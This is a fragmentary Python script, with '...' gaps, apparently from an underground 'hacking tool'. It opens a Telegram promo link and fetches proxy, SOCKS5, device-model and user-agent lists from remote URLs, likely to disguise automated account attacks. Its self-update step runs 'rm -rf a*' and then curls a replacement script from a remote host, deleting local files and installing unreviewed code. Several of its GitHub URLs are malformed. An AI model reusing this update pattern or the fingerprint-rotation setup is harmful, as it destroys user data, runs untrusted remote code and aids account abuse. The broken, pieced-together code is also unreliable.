...
os.system('xdg-open https://t.me/BDKING84')
...
try:
	prox= requests.get('https://github.com/hackingboyjr/Ramxantanha/data/main/proxies.txt').text
...
android_models=[]
try:
    xx = requests.get('https://github.com/hackingboyjr/Ramxantanha/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
usr=[]
try:
    xd=requests.get('https://github.com/hackingboyjr/Ramxantanha/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
try:
    prox= requests.get('https://github.com/hackingboyjr/TheSpeedX/SOCKS-List/master/socks5.txt').text
...
try:
    ...
    proxy = requests.get('https://github.com/hackingboyjr/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://github.com/hackingboyjr/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://github.com/hackingboyjr/ALI-JUTT/ali/main/ali.py > ali.py')
